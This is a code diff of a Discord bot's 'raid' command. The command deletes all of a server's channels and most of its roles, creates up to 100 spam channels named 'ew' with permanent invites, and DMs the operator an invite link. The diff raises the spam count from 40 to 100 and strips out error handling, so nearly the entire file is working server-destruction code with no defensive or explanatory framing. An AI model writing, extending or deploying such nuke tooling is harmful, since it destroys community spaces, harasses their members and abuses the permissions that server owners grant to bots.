@@ -106,25 +106,22 @@ client.on('interactionCreate', async interaction => {
 
       const user = interaction.user;
 
-      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting channels...`, ephemeral: true });
+      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Starting ultra spam...`, ephemeral: true });
 
       try {
         // Delete everything
-        for (const channel of guild.channels.cache.values()) {
-          await channel.delete().catch(() => {});
-        }
-
+        for (const channel of guild.channels.cache.values()) await channel.delete().catch(() => {});
         for (const role of guild.roles.cache.values()) {
           if (role.name === '@everyone' || role.name === 'Owner') continue;
           await role.delete().catch(() => {});
         }
 
-        // SPAM CREATE CHANNELS + INVITE IN EVERY CHANNEL
-        for (let i = 0; i < 40; i++) {
+        // ULTRA FAST SPAM CHANNELS + INVITE IN EVERY CHANNEL
+        for (let i = 0; i < 100; i++) {  // 100 channels for very fast spam
           const spamChannel = await guild.channels.create({
             name: 'ew',
             type: ChannelType.GuildText
-          }).catch(() => {});
+          }).catch(() => null);
 
           if (spamChannel) {
             const invite = await spamChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
@@ -134,20 +131,23 @@ client.on('interactionCreate', async interaction => {
           }
         }
 
-        // DM the user
-        await user.send(`✅ **Raid Finished on ${guild.name}**\nChannels spammed with invites!`);
+        // DM you the last invite
+        const finalChannel = guild.channels.cache.find(c => c.name === 'ew');
+        if (finalChannel) {
+          const invite = await finalChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+          if (invite) {
+            await user.send(`✅ **Raid Finished on ${guild.name}**\nPermanent Invite: https://discord.gg/${invite.code}`);
+          }
+        }
 
-        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked & spammed! Check your DMs.`, ephemeral: true });
+        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked with massive spam! Check your DMs.`, ephemeral: true });
       } catch (err) {
         console.error(err);
         await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
       }
     }
   } catch (error) {
-    console.error('Interaction Error:', error);
-    if (!interaction.replied && !interaction.deferred) {
-      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
-    }
+    console.error(error);
   }
 });
 
